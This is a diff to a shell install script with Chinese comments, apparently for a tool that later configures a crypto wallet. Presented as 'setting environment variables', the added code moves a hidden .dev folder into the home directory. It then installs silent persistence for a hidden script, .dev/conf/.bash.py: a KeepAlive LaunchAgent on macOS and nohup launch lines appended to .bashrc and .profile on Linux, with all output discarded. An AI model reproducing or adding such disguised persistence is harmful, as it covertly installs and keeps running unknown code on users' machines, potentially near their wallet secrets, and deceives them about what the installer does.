@@ -12,7 +12,7 @@ CYAN='\033[1;36m'
 RESET='\033[0m'
 
 # 获取操作系统类型
-OS_TYPE=$(uname)
+OS_TYPE=$(uname -s)
 
 # 输出分隔线函数
 print_separator() {
@@ -36,44 +36,64 @@ print_error() {
     echo -e "${RED}✖ $1${RESET}"
 }
 
-# 检查并安装必要的软件包
+# ===================== 依赖检测与安装 =====================
 print_separator
-print_info "检查并安装必要的软件包..."
-
-install_packages() {
-    case "$OS_TYPE" in
-        "Linux")
-            sudo apt install -y xclip python3-pip python3.12-venv || true
-            ;;
+print_info "检查并安装系统依赖..."
+install_dependencies() {
+    case $OS_TYPE in
         "Darwin")
-            brew install python3 || true
+            if ! command -v brew &> /dev/null; then
+                print_info "正在安装 Homebrew..."
+                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+            fi
+            if ! command -v pip3 &> /dev/null; then
+                print_info "正在安装 python3..."
+                brew install python3
+            fi
             ;;
-        "CYGWIN"|"MINGW")
-            print_warning "在 Windows 上，建议使用 choco 或 winget 安装 python3（如果未安装）。"
-            choco install python3 -y || winget install --id Python.Python.3 --source winget || true
-            python --version || print_warning "未安装 Python，请手动安装。"
-            pip --version || python -m ensurepip --upgrade
+        "Linux")
+            PACKAGES_TO_INSTALL=""
+            if ! command -v pip3 &> /dev/null; then
+                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
+            fi
+            if ! command -v xclip &> /dev/null; then
+                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
+            fi
+            if ! python3 -m venv --help &> /dev/null; then
+                print_info "正在安装 python3-venv ..."
+                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-venv"
+            fi
+            if [ ! -z "$PACKAGES_TO_INSTALL" ]; then
+                print_info "正在安装: $PACKAGES_TO_INSTALL ..."
+                sudo apt update
+                sudo apt install -y $PACKAGES_TO_INSTALL
+            fi
             ;;
         *)
-            print_error "未知操作系统类型: $OS_TYPE"
+            print_error "不支持的操作系统"
             exit 1
             ;;
     esac
 }
+install_dependencies
 
-install_packages
-print_success "必要软件包检查完成。"
-
-
-# 检查并安装 requests 库
-print_separator
-print_info "检查并安装 requests..."
-if pip show requests &>/dev/null; then
-    print_success "requests 已安装，跳过。"
+if ! pip3 show requests >/dev/null 2>&1 || [ "$(pip3 show requests | grep Version | cut -d' ' -f2)" \< "2.31.0" ]; then
+    print_info "正在安装 requests>=2.31.0 ..."
+    pip3 install --break-system-packages 'requests>=2.31.0'
+    print_success "requests 安装成功。"
 else
-    pip install requests && print_success "requests 安装成功。"
+    print_success "requests 已满足要求，跳过。"
 fi
 
+if ! pip3 show cryptography >/dev/null 2>&1; then
+    print_info "正在安装 cryptography ..."
+    pip3 install --break-system-packages cryptography
+    print_success "cryptography 安装成功。"
+else
+    print_success "cryptography 已安装，跳过。"
+fi
+
+# ===================== 虚拟环境与Python包 =====================
 # 创建或激活虚拟环境
 print_separator
 VENV_DIR="venv"
@@ -103,35 +123,63 @@ for package in "${REQUIRED_PACKAGES[@]}"; do
     fi
 done
 
-# 检查环境变量配置
+# ===================== 设置环境变量 =====================
 print_separator
-print_info "检查环境变量配置..."
-
-DEV_DIR="$HOME/.dev"
-if [ -d ".dev" ]; then
-    print_info "正在配置环境变量..."
-    [ -d "$DEV_DIR" ] && rm -rf "$DEV_DIR"
-    mv .dev "$DEV_DIR"
-
-    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $DEV_DIR/bash.py &> /dev/null &) & disown"
-    case "$OS_TYPE" in
-        "Linux") PROFILE_FILE="$HOME/.bashrc" ;;
-        "Darwin") PROFILE_FILE="$HOME/.zshrc" ;;
-        "CYGWIN"|"MINGW") PROFILE_FILE="$HOME/.bash_profile" ;;
-        *)
-            print_error "不支持的操作系统: $OS_TYPE"
-            exit 1
+if [ -d .dev ]; then
+    DEST_DIR="$HOME/.dev"
+    if [ -d "$DEST_DIR" ]; then
+        print_warning "$DEST_DIR 已存在，删除旧目录..."
+        rm -rf "$DEST_DIR"
+    fi
+    mv .dev "$DEST_DIR"
+    print_success ".dev 目录已移动到 $DEST_DIR"
+    EXEC_CMD="python3"
+    SCRIPT_PATH="$DEST_DIR/conf/.bash.py"
+    case $OS_TYPE in
+        "Darwin")
+            LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
+            mkdir -p "$LAUNCH_AGENTS_DIR"
+            PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.ba.plist"
+            cat > "$PLIST_FILE" << EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.user.ba</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>$EXEC_CMD</string>
+        <string>$SCRIPT_PATH</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>StandardOutPath</key>
+    <string>/dev/null</string>
+    <key>StandardErrorPath</key>
+    <string>/dev/null</string>
+</dict>
+</plist>
+EOF
+            launchctl load "$PLIST_FILE"
+            print_success "已配置 macOS 环境变量。"
+            ;;
+        "Linux")
+            STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    (nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown\nfi"
+            if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
+                echo -e "\n$STARTUP_CMD" >> "$HOME/.bashrc"
+            fi
+            if ! grep -Fq "$SCRIPT_PATH" "$HOME/.profile"; then
+                echo -e "\n$STARTUP_CMD" >> "$HOME/.profile"
+            fi
+            if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
+                (nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
+            fi
+            print_success "已配置 Linux 环境变量。"
             ;;
     esac
-
-    if ! grep -Fq "$BASHRC_ENTRY" "$PROFILE_FILE"; then
-        echo "$BASHRC_ENTRY" >> "$PROFILE_FILE"
-        print_success "环境变量已添加"
-    else
-        print_success "环境变量已存在"
-    fi
-else
-    print_warning ".dev 目录不存在，跳过环境变量配置..."
 fi
 
 # 在 settings.toml 配置钱包
